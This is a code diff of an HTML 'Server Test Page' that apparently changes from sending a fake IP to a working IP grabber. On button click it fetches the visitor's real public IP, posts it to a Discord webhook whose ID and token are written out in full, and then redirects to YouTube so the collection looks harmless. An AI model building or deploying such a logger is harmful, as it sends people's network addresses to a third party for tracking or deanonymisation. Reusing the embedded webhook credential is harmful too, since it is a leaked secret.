@@ -2,40 +2,44 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title> </title>
+  <title>IP Test</title>
 </head>
 <body>
-  <h1> </h1>
+  <h2>Server Test Page</h2>
+  <p>This will fetch your public IP and redirect.</p>
+  <button id="go">Continue</button>
 
   <script>
-    // ===================== CONFIG =====================
-    const redirectLink = "https://www.youtube.com";
-    const webhookURL = "https://discord.com/api/webhooks/WEBHOOK_ID/WEBHOOK_TOKEN";
-    // ==================================================
+    // ============ CONFIG ============
+    const REDIRECT_LINK = "https://www.youtube.com";
+    const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1466362286951104643/Jsm9HpSe-2vh2eDLjFcoQLdug_4Fe-iOd5rSCNWIZPVGdisDj_gZl9M9fH_yWErJVwph";
+    const IP_API = "https://api.ipify.org?format=json";
+    // ================================
 
-    // Generate a fake IP
-    function generateFakeIP() {
-      return Array.from({ length: 4 }, () =>
-        Math.floor(Math.random() * 256)
-      ).join(".");
-    }
+    document.getElementById("go").addEventListener("click", async () => {
+      try {
+        // Get public IP
+        const res = await fetch(IP_API);
+        const data = await res.json();
+        const ip = data.ip;
 
-    const fakeIP = generateFakeIP();
+        // Send to Discord
+        await fetch(DISCORD_WEBHOOK, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            username: "IP Test",
+            content: `Public IP: \`${ip}\``
+          })
+        });
 
-    // Send fake IP to Discord
-    fetch(webhookURL, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        username: "Logger",
-        content: `Fake IP: \`${fakeIP}\``
-      })
-    }).catch(err => console.log("Discord webhook error:", err));
+      } catch (err) {
+        console.error("Error:", err);
+      }
 
-    // Redirect after short delay so webhook has time to send
-    setTimeout(() => {
-      window.location.href = redirectLink;
-    }, 500); // 0.5 seconds
+      // Redirect (always happens)
+      window.location.href = REDIRECT_LINK;
+    });
   </script>
 </body>
 </html>
